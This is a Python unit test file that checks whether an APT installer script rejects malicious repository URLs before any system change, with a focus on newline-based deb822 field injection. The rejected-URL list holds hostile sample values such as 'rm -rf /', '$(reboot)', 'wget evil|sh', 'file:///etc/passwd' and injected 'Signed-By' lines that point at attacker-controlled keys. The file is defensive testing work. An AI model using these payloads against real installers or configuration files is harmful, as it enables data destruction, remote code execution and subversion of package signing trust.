#!/usr/bin/env python3
"""Unit tests for psaab/xpf#9921 F-065 — install.sh must validate
XPF_APT_BASE_URL before any host mutation.

On base, install.sh validate() checked only non-emptiness while write_source()
interpolated the URL into the deb822 `URIs:` line of the root-owned
/etc/apt/sources.list.d/xpf.sources — so a newline-bearing URL in a root run
injected arbitrary deb822 fields, including `Signed-By` trust-root control
(the repo's own #5685/M40 rule was enforced at stamp time, not here).

The fix mirrors publish.validate_apt_url in shell (validate_apt_url, called
from validate() before preflight) and adds an XPF_INSTALL_SOURCE_ONLY hook so
these tests drive the REAL functions hermetically: every sourced case runs in
its own `sh -c` (the leaked `set -eu` + EXIT trap die with it).

RED on revert: drop the validate_apt_url call and every bad-URL case exits 0.
"""

from __future__ import annotations

import importlib.util
import os
import shutil
import subprocess
import tempfile
import unittest
from pathlib import Path

_DIST = Path(__file__).resolve().parent
_INSTALLSH = _DIST / "install.sh"

_SPEC = importlib.util.spec_from_file_location("publish", _DIST / "publish.py")
publish = importlib.util.module_from_spec(_SPEC)
assert _SPEC.loader is not None
_SPEC.loader.exec_module(publish)

_FAKE_ARCHIVE_KEY = """\
-----BEGIN PGP PUBLIC KEY BLOCK-----

mDMEZmFakeArchiveKeyForInstallValidateTestNotARealKeyAAAAAAAAAAAAAAA
=AbC1
-----END PGP PUBLIC KEY BLOCK-----
"""

# Legitimate URLs the installer MUST accept (publish's battery plus the
# adjudicated structural edges — single-char host, missing/root/double-slash
# path, IPv4(+port), uppercase scheme+host, boundary ports, interior
# hyphen/dot runs).
_GOOD_URLS = [
    "https://dl.example.com/apt",
    "https://apt.example.org",
    "https://apt.example.org/",
    "https://downloads.example.net/xpf/apt",
    "https://mirror.example.com:8443/apt/xpf",
    "https://a.b-c.example.com/xpf.apt/pool_1",
    "https://host.example.com/~xpf/apt",
    "https://a/x",
    "https://host",
    "https://h/",
    "https://h//x",
    "https://1.2.3.4/x",
    "https://1.2.3.4:8443/x",
    "HTTPS://H/X",
    "https://a-b.example/x",
    "https://a-.example/x",
    "https://a..b.example/x",
    "https://host:0/x",
    "https://host:65536/x",
    "https://h:8/x",
    "https://h",
]

# Malicious / malformed URLs the installer MUST refuse before any mutation:
# publish's battery plus the F-065 deb822 payloads, every denylisted byte,
# controls/DEL/high-bytes, and the structural edges (empty/multi-colon port,
# colon-in-path, dotted/hostname edges, empty host).
_BAD_URLS = [
    "https://x.invalid/apt'; rm -rf / #",
    "https://x.invalid/apt'$(reboot)'",
    "https://x.invalid/$(id)",
    "https://x.invalid/`id`",
    "https://x.invalid/apt; wget evil|sh",
    "https://x.invalid/apt && curl evil",
    "https://x.invalid/apt\nrm -rf /",
    "https://x.invalid/apt with space",
    'https://x.invalid/apt"quote',
    "https://x.invalid/apt$VAR",
    "http://x.invalid/apt",
    "file:///etc/passwd",
    "ftp://x.invalid/apt",
    "javascript:alert(1)",
    "x.invalid/apt",
    "",
    "https://user:pass@x.invalid/apt",
    "https://x.invalid/apt?a=b",
    "https://x.invalid/apt#frag",
    "https://x.invalid/apt%27",
    "https://x.invalid/%%XPF_APT_BASE_URL%%",
    # F-065: deb822 field injection via the URIs line.
    "https://apt.example.invalid/dists\nSigned-By: /tmp/evil9921.gpg",
    "https://x.invalid/apt\r\nSigned-By: /tmp/evil",
    "https://x.invalid/apt\nTypes: deb\nURIs: https://evil.invalid/x",
    "https://x.invalid/apt\tindented",
    "https://x.invalid/apt\rcarriage",
    "https://x.invalid/apt\x0bvertical",
    "https://x.invalid/apt\x0cformfeed",
    "https://x.invalid/apt\x7fdel",
    "https://x.invalid/apé",
    # Every remaining denylisted byte, one cell each.
    "https://x.invalid/ap\\t",
    "https://x.invalid/a;b",
    "https://x.invalid/a|b",
    "https://x.invalid/a<b",
    "https://x.invalid/a>b",
    "https://x.invalid/a(b",
    "https://x.invalid/a)b",
    "https://x.invalid/a{b",
    "https://x.invalid/a}b",
    "https://x.invalid/a[b",
    "https://x.invalid/a]b",
    "https://x.invalid/a*b",
    "https://x.invalid/a!b",
    "https://x.invalid/a=b",
    "https://x.invalid/a+b",
    "https://x.invalid/a,b",
    # Structural edges (publish rejects every one of these).
    "https://host:/x",
    "https://a:b:c/x",
    "https://h/a:b",
    "https://host./x",
    "https://-a.example/x",
    "https://_h/x",
    "https://:8080/x",
    "https:///x",
    "https://host:999999/x",
    "https://",
]


def _run_sourced(body, url=None, channel="stable", extra_env=None):
    """Run `body` in a fresh sh sourcing install.sh (SOURCE_ONLY, dry-run).

    The URL travels via XPF_TEST_URL so newlines/metacharacters need no shell
    quoting. Returns (rc, combined_output)."""
    env = dict(os.environ)
    env.update({
        "XPF_INSTALL_SOURCE_ONLY": "1",
        "XPF_DRY_RUN": "1",
        "XPF_TEST_CHANNEL": channel,
    })
    if url is not None:
        env["XPF_TEST_URL"] = url
    env.pop("XPF_APT_BASE_URL", None)
    env.pop("XPF_CHANNEL", None)
    if extra_env:
        env.update(extra_env)
    script = f'. "$1"; {body}'
    p = subprocess.run(["sh", "-c", script, "sh", str(_INSTALLSH)],
                       capture_output=True, text=True, env=env, timeout=30)
    return p.returncode, (p.stdout or "") + (p.stderr or "")


def _validate(url, channel="stable", preflight_stub="preflight() { :; }",
              extra_env=None):
    body = (f"{preflight_stub}; XPF_APT_BASE_URL=\"$XPF_TEST_URL\"; "
            f"CHANNEL=\"$XPF_TEST_CHANNEL\"; validate")
    return _run_sourced(body, url=url, channel=channel, extra_env=extra_env)


class SourcedValidateTests(unittest.TestCase):
    def test_good_urls_pass_validate(self):
        for u in _GOOD_URLS:
            with self.subTest(url=u):
                rc, out = _validate(u)
                self.assertEqual(rc, 0, f"legit URL refused: {out[-400:]}")

    def test_bad_urls_rejected_with_input_named(self):
        # Every refusal must name the input (a wrong-reason death also exits
        # nonzero). Run under C and UTF-8 locales: control rejection is
        # locale-independent.
        for loc in ("C", "C.UTF-8"):
            for u in _BAD_URLS:
                with self.subTest(url=u, locale=loc):
                    rc, out = _validate(u, extra_env={"LC_ALL": loc})
                    self.assertNotEqual(
                        rc, 0, f"bad URL accepted under {loc}: {u!r}")
                    self.assertIn(
                        "XPF_APT_BASE_URL", out,
                        f"refusal names no input (wrong reason?) under {loc}: "
                        f"{out[-300:]}")

    def test_parity_with_publish_on_every_case(self):
        # Dual-drive: the shell mirror and publish.validate_apt_url must AGREE
        # accept/reject on every battery case (good, bad, and edges).
        for u in _GOOD_URLS + _BAD_URLS:
            with self.subTest(url=u):
                try:
                    publish.validate_apt_url(u)
                    publish_ok = True
                except SystemExit:
                    publish_ok = False
                rc, out = _validate(u)
                shell_ok = (rc == 0)
                self.assertEqual(
                    shell_ok, publish_ok,
                    f"validators disagree on {u!r}: publish="
                    f"{'accept' if publish_ok else 'reject'}, shell="
                    f"{'accept' if shell_ok else 'reject'} ({out[-200:]})")

    def test_uppercase_scheme_accepted_like_publish(self):
        # Q1, pinned explicitly (not just via parity): publish's urlsplit
        # lowercases the scheme, so a stamped uppercase URL must install.
        try:
            publish.validate_apt_url("HTTPS://apt.example.com/x")
        except SystemExit as e:
            self.fail(f"publish rejects uppercase scheme: {e}")
        rc, out = _validate("HTTPS://apt.example.com/x")
        self.assertEqual(rc, 0, out[-300:])

    def test_bad_channel_still_rejected(self):
        rc, out = _validate("https://dl.example.com/apt", channel="beta")
        self.assertNotEqual(rc, 0)
        self.assertIn("XPF_CHANNEL", out)


class HoistTests(unittest.TestCase):
    def test_bad_url_dry_run_refused_before_preflight_e2e(self):
        # Real main (no source hook): a bad URL dies before preflight on ANY
        # host, so this is hermetic even where preflight would fail.
        env = dict(os.environ)
        env.update({
            "XPF_DRY_RUN": "1",
            "XPF_APT_BASE_URL": "https://apt.example.invalid/dists\n"
                                "Signed-By: /tmp/evil9921.gpg",
            "XPF_CHANNEL": "stable",
        })
        p = subprocess.run(["sh", str(_INSTALLSH)], capture_output=True,
                           text=True, env=env, timeout=60)
        out = (p.stdout or "") + (p.stderr or "")
        self.assertNotEqual(p.returncode, 0)
        self.assertIn("XPF_APT_BASE_URL", out)
        self.assertNotIn("preflight", out,
                         "preflight ran before the URL gate — hoist missing")
        self.assertNotIn("Types: deb", out,
                         "refused URL reached the rendered source block")

    def test_failing_preflight_stub_proves_order(self):
        stub = "preflight() { echo PREFLIGHT_RAN; return 1; }"
        rc, out = _validate("https://x.invalid/\n", preflight_stub=stub)
        self.assertNotEqual(rc, 0)
        self.assertNotIn("PREFLIGHT_RAN", out,
                         "bad URL reached preflight — hoist missing")
        self.assertIn("XPF_APT_BASE_URL", out)
        # Control: a good URL DOES reach preflight (and dies there only
        # because the stub fails loudly under the leaked set -e).
        rc, out = _validate("https://dl.example.com/apt", preflight_stub=stub)
        self.assertNotEqual(rc, 0)
        self.assertIn("PREFLIGHT_RAN", out)


class PrecedenceTests(unittest.TestCase):
    def setUp(self):
        self.dir = tempfile.mkdtemp(prefix="xpf-install9921-")
        self.addCleanup(shutil.rmtree, self.dir, ignore_errors=True)
        self.key = os.path.join(self.dir, "archive.asc")
        Path(self.key).write_text(_FAKE_ARCHIVE_KEY)

    def _stamped(self, apt_url, channel):
        out = os.path.join(self.dir, "install.baked.sh")
        publish.stamp_installer(out, archive_key=self.key, apt_url=apt_url,
                                channel=channel)
        return out

    def _sourced_vars(self, path, extra_env=None):
        env = dict(os.environ)
        env["XPF_INSTALL_SOURCE_ONLY"] = "1"
        env.pop("XPF_APT_BASE_URL", None)
        env.pop("XPF_CHANNEL", None)
        if extra_env:
            env.update(extra_env)
        p = subprocess.run(
            ["sh", "-c", '. "$1"; printf "%s|%s" "$XPF_APT_BASE_URL" "$CHANNEL"',
             "sh", path],
            capture_output=True, text=True, env=env, timeout=30)
        self.assertEqual(p.returncode, 0, p.stderr[-300:])
        return p.stdout

    def test_env_beats_baked(self):
        stamped = self._stamped("https://baked.example.invalid/apt", "edge")
        self.assertEqual(
            self._sourced_vars(stamped),
            "https://baked.example.invalid/apt|edge")
        self.assertEqual(
            self._sourced_vars(stamped, extra_env={
                "XPF_APT_BASE_URL": "https://env.example.invalid/o",
                "XPF_CHANNEL": "stable",
            }),
            "https://env.example.invalid/o|stable")

    def test_stamped_baked_url_validates(self):
        stamped = self._stamped("https://baked.example.invalid/apt", "edge")
        env = dict(os.environ)
        env.update({"XPF_INSTALL_SOURCE_ONLY": "1", "XPF_DRY_RUN": "1"})
        env.pop("XPF_APT_BASE_URL", None)
        env.pop("XPF_CHANNEL", None)
        p = subprocess.run(
            ["sh", "-c", '. "$1"; preflight() { :; }; validate', "sh", stamped],
            capture_output=True, text=True, env=env, timeout=30)
        self.assertEqual(p.returncode, 0, (p.stderr or "")[-300:])


if __name__ == "__main__":
    unittest.main()
